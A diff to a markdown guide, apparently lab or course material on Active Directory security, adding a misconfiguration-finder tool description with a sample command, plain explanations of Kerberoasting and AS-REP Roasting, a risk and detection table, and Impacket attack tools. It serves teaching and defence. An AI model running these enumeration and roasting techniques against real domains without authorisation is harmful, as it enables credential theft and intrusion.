@@ -438,7 +1180,81 @@ python3 ad_enum.py 10.10.10.100 corp.local -u lowpriv -p Password123 --tls -o en
 
 ---
 
-## 5. Reference Tools
+## 5. AD Misconfiguration Finder
+
+The `ADMisconfigFinder` performs systematic LDAP-based checks for common Active Directory misconfigurations:
+
+**`check_kerberoastable()`** — finds user accounts with SPNs (Kerberoasting targets), reports password age
+
+**`check_asrep_roastable()`** — finds accounts with pre-authentication disabled (AS-REP Roasting targets)
+
+**`check_password_never_expires()`** — identifies accounts with `DONT_EXPIRE_PASSWORD` flag, especially privileged ones
+
+**`check_admin_count()`** — detects excessive number of protected accounts (`adminCount=1`)
+
+**`check_stale_accounts(days=90)`** — finds enabled accounts with no login in 90+ days
+
+**Usage:**
+```bash
+python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123 -o report.json
+```
+
+---
+
+## 6. Common AD Misconfigurations Explained
+
+### 6.1 Why Kerberoasting Works
+
+```
+[Kerberoasting explained]
+
+Normal flow:
+  User → KDC: "I want to access the SQL server"
+  KDC → "Here is a ticket encrypted with the SQL service account hash"
+  User → SQL Server: presents ticket → access granted
+
+Attacker flow:
+  Attacker → KDC: "I want to access the SQL server" (completely legitimate request!)
+  KDC → encrypted ticket (using service account hash)
+  Attacker → cracks the ticket offline → recovers service account password!
+
+The problem: This is a fully legitimate Kerberos request — hard to distinguish from normal
+```
+
+### 6.2 Why AS-REP Roasting Works
+
+```
+[AS-REP Roasting explained]
+
+Normal Kerberos pre-authentication:
+  Client → KDC: "I am alice" + encrypted timestamp (proves identity)
+  KDC: validates timestamp, issues TGT
+
+When pre-auth is disabled:
+  Attacker → KDC: "I am alice" (no proof required!)
+  KDC: sends back response encrypted with alice's hash
+  Attacker: cracks response offline → recovers alice's password!
+
+Analogy: Imagine calling a reception desk and asking for "Alice's extension"
+         and they just read it out without verifying who you are
+```
+
+### 6.3 Misconfiguration Risk Summary
+
+| Misconfiguration | Risk | Attack | Detection |
+|-----------------|------|--------|-----------|
+| SPN on regular user | HIGH | Kerberoasting | Event 4769, RC4 encryption requests |
+| Pre-auth disabled | HIGH | AS-REP Roasting | Event 4768 |
+| Too many domain admins | HIGH | Direct privilege abuse | Admin group membership audit |
+| AdminSDHolder modified | HIGH | ACL-based persistence | Event 5136 |
+| DCSync rights over-granted | CRITICAL | DCSync | Event 4662 |
+| No password policy | MEDIUM | Brute force | Account lockout threshold check |
+| LAPS not deployed | MEDIUM | Local admin hash reuse | LAPS deployment status |
+| SMB signing disabled | HIGH | NTLM relay | SMB signing policy check |
+
+---
+
+## 7. Reference Tools
 
 | Tool | Purpose |
 |------|---------|
@@ -450,3 +1266,5 @@ python3 ad_enum.py 10.10.10.100 corp.local -u lowpriv -p Password123 --tls -o en
 | `rpcclient` | RPC-based AD enumeration |
 | `enum4linux-ng` | Linux SMB/AD enumeration |
 | `ADRecon` | Forensic-friendly AD information collection |
+| `Impacket GetUserSPNs.py` | Kerberoasting |
+| `Impacket GetNPUsers.py` | AS-REP Roasting |
